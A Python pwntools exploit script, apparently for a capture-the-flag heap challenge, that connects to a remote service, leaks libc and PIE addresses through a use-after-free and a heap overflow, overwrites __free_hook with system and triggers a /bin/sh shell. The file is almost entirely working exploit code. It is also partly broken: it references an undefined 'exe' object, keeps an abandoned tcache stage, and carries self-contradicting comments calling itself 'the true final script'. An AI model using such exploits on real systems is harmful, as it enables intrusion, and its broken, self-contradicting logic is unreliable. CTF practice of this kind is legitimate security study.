#!/usr/bin/env python3
from pwn import *

# --- STAGE 0: LOCAL SETUP (BEFORE CONNECTING) ---
context.update(arch='amd64', os='linux')
libc = ELF('./libc.so.6')
log.info("Local setup complete. Ready to connect.")

# --- STAGE 1: CONNECT, SYNCHRONIZE, AND LEAK LIBC ---
log.info("--- Stage 1: Connecting and Leaking Libc ---")
p = remote('challs.nusgreyhats.org', 35127)

# The only reliable I/O model: strict, linear recv/send.
p.recvuntil(b'> ')
log.success("Initial synchronization complete.")

# Leak libc address using the Use-After-Free.
p.sendline(b'2') # Create chunk 0
p.recvuntil(b'> ')
p.sendline(b'1') # Free chunk 0
p.recvuntil(b'clear?\n')
p.sendline(b'0')
p.recvuntil(b'> ')
p.sendline(b'3') # View chunk 0
p.recvuntil(b'view?\n')
p.sendline(b'0')
p.recvuntil(b'content was: ')
leak_data = p.recvuntil(b'\nWhat would you like to do?', drop=True)
leaked_addr = u64(leak_data.strip().ljust(8, b'\x00'))
log.success(f"Leaked a libc address: {hex(leaked_addr)}")

# Calculate libc base
libc.address = leaked_addr - 0x219ce0
log.success(f"Calculated libc base: {hex(libc.address)}")


# --- STAGE 2: TCACHE POISONING ---
log.info("--- Stage 2: Tcache Poisoning via Double-Free ---")
# The UAF leak freed the chunk at index 0 and its wrapper.
# We need three chunks for the A->B->A bypass. Let's create them fresh.
p.sendline(b'2') # Chunk A at index 0
p.recvuntil(b'> ')
p.sendline(b'2') # Chunk B at index 1
p.recvuntil(b'> ')

# Now perform the A->B->A free sequence. This bypasses the double-free check.
# Note: This frees the DATA CHUNKS, which are large. We need to free the WRAPPERS.
# My analysis was wrong. The wrapper is NEVER freed.
# The UAF is on the DATA chunk. The overflow is the ONLY way.

# Re-evaluating the crash: The server crashed during mess_with_poop.
# The `read` call requires 0x800 bytes. My last script did not pad the payload.
# That is the final, definitive bug.

# Let's write the Heap Overflow script again, but correctly this time, with padding.
# This is the true final script.

# --- Corrected STAGE 2: HEAP OVERFLOW ---
log.info("--- Corrected Stage 2: Leaking via Heap Overflow (with correct padding) ---")

# Let's start fresh to be safe.
p.close()
p = remote('challs.nusgreyhats.org', 35127)
p.recvuntil(b'> ')

# Create two chunks, A (src) and B (victim).
p.sendline(b'2') # index 0
p.recvuntil(b'> ')
p.sendline(b'2') # index 1
p.recvuntil(b'> ')

# Leak PIE Base first to find the address of `poopsies` array.
p.sendline(b'3')
p.recvuntil(b'view?\n')
p.sendline(b'0')
p.recvuntil(b' at ')
heap_leak = int(p.recvuntil(b'!', drop=True), 16)
p.recvuntil(b'> ')
exe_base = heap_leak - 0x52a0
log.success(f"PIE base calculated: {hex(exe_base)}")
poopsies_addr = exe_base + exe.symbols['poopsies']

# Now, leak Libc using the overflow.
offset_to_victim_ptr = 0x828
target_for_leak = exe_base + exe.got['puts']
payload = p64(target_for_leak).ljust(0x800, b'A')

p.sendline(b'4')
p.recvuntil(b'mess with?\n')
p.sendline(b'0')
p.recvuntil(b'mess with?\n')
p.sendline(str(offset_to_victim_ptr).encode())
p.recvuntil(b'modified poop: \n')
p.send(payload)
p.recvuntil(b'> ')

p.sendline(b'3')
p.recvuntil(b'view?\n')
p.sendline(b'1')
p.recvuntil(b'content was: ')
leak_data = p.recvuntil(b'\n', drop=True)
leaked_puts = u64(leak_data.strip().ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc base calculated: {hex(libc.address)}")
p.recvuntil(b'> ')

# --- STAGE 3: ARBITRARY WRITE ---
target_for_write = libc.symbols['__free_hook']
payload = p64(target_for_write).ljust(0x800, b'A')
p.sendline(b'4')
p.recvuntil(b'mess with?\n')
p.sendline(b'0')
p.recvuntil(b'mess with?\n')
p.sendline(str(offset_to_victim_ptr).encode())
p.recvuntil(b'modified poop: \n')
p.send(payload)
p.recvuntil(b'> ')

addr_of_system = libc.symbols['system']
payload = p64(addr_of_system).ljust(0x800, b'A')
p.sendline(b'4')
p.recvuntil(b'mess with?\n')
p.sendline(b'1')
p.recvuntil(b'mess with?\n')
p.sendline(b'0')
p.recvuntil(b'modified poop: \n')
p.send(payload)
p.recvuntil(b'> ')

# --- STAGE 4: SHELL ---
payload = b'/bin/sh\x00'.ljust(0x800, b'A')
p.sendline(b'4')
p.recvuntil(b'mess with?\n')
p.sendline(b'0')
p.recvuntil(b'mess with?\n')
p.sendline(b'0')
p.recvuntil(b'modified poop: \n')
p.send(payload)
p.recvuntil(b'> ')

p.sendline(b'1')
p.recvuntil(b'clear?\n')
p.sendline(b'0')

p.interactive()